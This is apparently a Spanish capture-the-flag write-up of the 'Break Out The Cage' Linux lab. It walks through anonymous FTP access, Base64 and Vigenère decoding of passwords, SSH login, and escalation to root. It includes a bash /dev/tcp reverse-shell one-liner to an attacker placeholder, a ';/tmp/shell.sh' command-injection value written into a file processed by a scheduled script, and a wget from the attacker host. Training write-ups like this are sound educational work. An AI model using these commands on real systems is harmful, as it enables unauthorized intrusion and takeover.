# Break Out The Cage

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux mediante la explotación de un servicio **FTP** con acceso anónimo, obtener credenciales ocultas mediante técnicas de decodificación y criptografía clásica, acceder al sistema mediante **SSH**, aprovechar una mala configuración en un proceso automatizado para escalar privilegios hasta otro usuario y, finalmente, obtener acceso como **root** reutilizando credenciales descubiertas en información sensible.

---

## 🛠️ Tecnologías trabajadas

- AutoNmap
- Incursore
- FTP
- Base64
- Cifrado Vigenère
- SSH
- pspy64
- Python
- Reverse Shell
- Netcat

---

## 🧠 Metodología

La enumeración inicial permitió identificar un servicio **FTP** con acceso anónimo. Tras descargar un archivo expuesto, fue necesario realizar varias fases de análisis, incluyendo la decodificación en **Base64** y el descifrado mediante el algoritmo **Vigenère**, obteniendo así unas credenciales válidas para acceder al sistema mediante **SSH**.

Una vez dentro, la enumeración local reveló la existencia de un proceso automatizado ejecutado periódicamente por otro usuario. Mediante la monitorización con **pspy64** fue posible identificar el script responsable y descubrir que utilizaba un archivo modificable por nuestro usuario. Aprovechando esta situación, se inyectó una **reverse shell** que permitió obtener acceso como el usuario `cage`.

Finalmente, el análisis de varios correos almacenados en el sistema permitió recuperar unas credenciales cifradas. Tras descifrarlas nuevamente con **Vigenère**, fue posible autenticarse como **root** y completar el compromiso total de la máquina.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un reconocimiento utilizando **AutoNmap** e **Incursore**.

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

El acceso anónimo al servicio FTP destacaba como el vector de entrada más prometedor.

---

### 2. Enumeración web

Accedí a la aplicación web.

```text
http://10.129.131.8
```

Durante el análisis manual encontré un posible usuario.

```text
weston
```

Posteriormente realicé un descubrimiento de directorios.

```bash
ffuf -w /usr/share/wordlists/seclists/fav-wordlist.txt -u http://10.129.131.8/FUZZ
```

Se localizaron los siguientes recursos:

- `/contracts`
- `/images`
- `/scripts`
- `/html`
- `/auditions`

Tras revisar todos ellos no encontré información relevante para continuar con la explotación.

---

### 3. Enumeración FTP

El servidor permitía autenticación anónima.

Accedí mediante:

```bash
ftp anonymous@10.129.131.8
```

Durante la navegación encontré el archivo:

```text
dad_tasks
```

Lo descargué para analizarlo.

```bash
get dad_tasks
```

Su contenido estaba codificado en **Base64**.

Tras decodificarlo obtuve un mensaje cifrado mediante **Vigenère**.

Después de descifrarlo recuperé la siguiente contraseña.

```text
Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

Combinándola con el usuario descubierto anteriormente obtuve unas credenciales válidas.

Usuario:

```text
weston
```

---

### 4. Acceso inicial

Accedí al sistema mediante **SSH**.

```bash
ssh weston@10.129.131.8
```

Introduciendo la contraseña recuperada obtuve acceso al sistema.

---

### 5. Enumeración local

Comencé revisando el sistema.

El usuario **weston** no almacenaba información especialmente útil en su directorio personal.

Durante la enumeración observé la existencia del usuario:

```text
cage
```

No disponía de permisos para acceder a su directorio.

Comprobé los permisos sudo.

```bash
sudo -l
```

Resultado:

```text
(root) /usr/bin/bees
```

Ejecuté el binario.

```bash
sudo /usr/bin/bees
```

Observé varios mensajes enviados mediante:

```text
Broadcast message
```

Uno de ellos pertenecía al usuario:

```text
cage
```

Esto indicaba que existía un proceso ejecutándose periódicamente bajo dicho usuario.

---

### 6. Monitorización de procesos

Para identificar dicho proceso utilicé **pspy64**.

Desde la máquina atacante compartí la herramienta y posteriormente la descargué.

```bash
cd /tmp
wget http://<IP_ATACANTE>:8000/pspy64
chmod +x pspy64
```

La ejecuté.

```bash
./pspy64
```

Observé que el usuario **cage** ejecutaba periódicamente un script Python.

Analicé su contenido.

```bash
cat /opt/.dads_scripts/spread_the_quotes.py
```

El script utilizaba como entrada el archivo:

```text
/opt/.dads_scripts/.files/.quotes
```

Comprobé que dicho archivo era modificable por el usuario **weston**, lo que permitía controlar el contenido procesado por el script.

---

### 7. Escalada al usuario cage

Preparé una pequeña reverse shell.

```bash
cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/<IP_ATACANTE>/8888 0>&1
EOF
```

Le asigné permisos de ejecución.

```bash
chmod +x /tmp/shell.sh
```

Posteriormente modifiqué el archivo utilizado por el proceso automático.

```bash
printf 'Hello;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
```

Antes inicié un listener.

```bash
nc -lvnp 8888
```

Cuando el proceso volvió a ejecutarse recibí una conexión como:

```text
cage
```

Con ello conseguí acceso al segundo usuario del sistema.

---

### 8. Obtención de la User Flag

Dentro del directorio personal del usuario encontré el archivo:

```text
Super_Duper_Checklist
```

Leí su contenido.

```bash
cat Super_Duper_Checklist
```

---

### 9. Obtención de credenciales de root

Durante la enumeración encontré el directorio:

```text
email_backup
```

En él había varios correos electrónicos.

El archivo más interesante era:

```text
email_3
```

Su contenido incluía el texto:

```text
haiinspsyanileph
```

El propio mensaje hacía repetidas referencias a la palabra:

```text
face
```

Esta pista sugería nuevamente el uso del cifrado **Vigenère**.

Tras descifrar el mensaje recuperé la contraseña del usuario **root**.

---

### 10. Escalada de privilegios

Con las credenciales recuperadas obtuve acceso al usuario privilegiado.

```bash
sudo su
```

Introduciendo la contraseña obtenida durante el análisis de los correos conseguí una shell como:

```text
root
```

---

### 11. Obtención de la flag final

Accedí al directorio:

```bash
cd /root/email_backup
```

Leí el contenido del archivo:

```bash
cat email_2
```

---

## 📚 Lecciones aprendidas

- Este laboratorio combinó varias técnicas diferentes en una misma cadena de explotación, obligando a alternar entre enumeración, análisis de información, criptografía clásica, monitorización de procesos y reutilización de credenciales.
- Identificar accesos anónimos inseguros en servicios FTP.
- Recuperar información oculta mediante decodificación Base64.
- Descifrar mensajes utilizando el algoritmo de **Vigenère**.
- Acceder al sistema mediante credenciales recuperadas durante la enumeración.
- Monitorizar procesos en tiempo real utilizando **pspy64**.
- Analizar scripts automatizados ejecutados por otros usuarios.
- Aprovechar archivos modificables utilizados por procesos privilegiados.
- Obtener una reverse shell mediante la manipulación de un proceso automatizado.
- Analizar información sensible almacenada en correos electrónicos.
- Reutilizar credenciales descubiertas durante la post-explotación para obtener acceso como **root**.
